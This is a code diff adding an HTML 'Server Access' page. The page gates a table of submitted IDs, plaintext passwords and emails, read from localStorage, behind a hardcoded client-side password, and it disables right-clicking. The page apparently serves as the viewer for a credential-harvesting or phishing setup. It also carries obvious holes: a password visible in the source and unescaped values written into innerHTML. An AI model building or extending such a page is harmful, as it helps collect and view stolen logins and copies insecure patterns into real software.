@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Server Access</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background-color: #ff5733;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        .password-container {
+            padding: 20px;
+            margin: 20px auto;
+            max-width: 500px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 4px;
+            border: 1px solid #ddd;
+        }
+        button {
+            background-color: #ff5733;
+            color: white;
+            border: none;
+        }
+        button:hover {
+            background-color: #e04d23;
+        }
+        .server-container {
+            display: none;
+            padding: 20px;
+            margin: 20px auto;
+            max-width: 800px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+        th, td {
+            padding: 12px;
+            text-align: left;
+            border: 1px solid #ddd;
+        }
+        th {
+            background-color: #ff5733;
+            color: white;
+        }
+        td {
+            background-color: #f9f9f9;
+        }
+        .delete-btn {
+            background-color: #e04d23;
+            color: white;
+            padding: 5px 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .delete-btn:hover {
+            background-color: #c0392b;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <h1>Server Access</h1>
+</header>
+
+<!-- Password Protection to access Server Page -->
+<div class="password-container" id="passwordContainer">
+    <h2>Enter Password to Access Server Page</h2>
+    <input type="password" id="passwordInput" placeholder="Enter password">
+    <button onclick="checkPassword()">Submit</button>
+</div>
+
+<!-- Server Page (Only visible to admin after correct password) -->
+<div class="server-container" id="serverPage">
+    <h2>Server Page (Admin Only)</h2>
+    <h3>Submitted Information:</h3>
+    <table>
+        <thead>
+            <tr>
+                <th>ID</th>
+                <th>Password</th>
+                <th>Email</th>
+                <th>Action</th>
+            </tr>
+        </thead>
+        <tbody id="serverList">
+            <!-- Submitted credentials will appear here -->
+        </tbody>
+    </table>
+</div>
+
+<script>
+// Show password container on page load
+window.onload = function() {
+    document.getElementById('passwordContainer').style.display = 'block';
+};
+
+// Check Password Function for Admin
+function checkPassword() {
+    const passwordInput = document.getElementById('passwordInput').value;
+    const correctPassword = "9704581290"; // Admin Password (Change this for security)
+
+    if (passwordInput === correctPassword) {
+        // Hide password container and show server page
+        document.getElementById('passwordContainer').style.display = 'none';
+        document.getElementById('serverPage').style.display = 'block'; // Show server page
+        loadServerData();
+    } else {
+        alert("Incorrect password. Please try again.");
+    }
+}
+
+// Load server data (display all submitted information for admin)
+function loadServerData() {
+    const credentials = JSON.parse(localStorage.getItem('credentials')) || [];
+    const serverList = document.getElementById('serverList');
+    serverList.innerHTML = '';
+
+    credentials.forEach((credential, index) => {
+        const tr = document.createElement('tr');
+        tr.innerHTML = `
+            <td>${credential.id}</td>
+            <td>${credential.password}</td>
+            <td>${credential.email}</td>
+            <td><button class="delete-btn" onclick="deleteCredential(${index})">Delete</button></td>
+        `;
+        serverList.appendChild(tr);
+    });
+}
+
+// Delete a credential permanently
+function deleteCredential(index) {
+    const credentials = JSON.parse(localStorage.getItem('credentials')) || [];
+    credentials.splice(index, 1); // Remove the selected item
+    localStorage.setItem('credentials', JSON.stringify(credentials)); // Update localStorage
+    loadServerData(); // Reload the server data
+}
+</script>
+<script>
+    document.addEventListener("contextmenu", (event) => {
+      event.preventDefault();
+    });
+  </script>
+</body>
+</html>
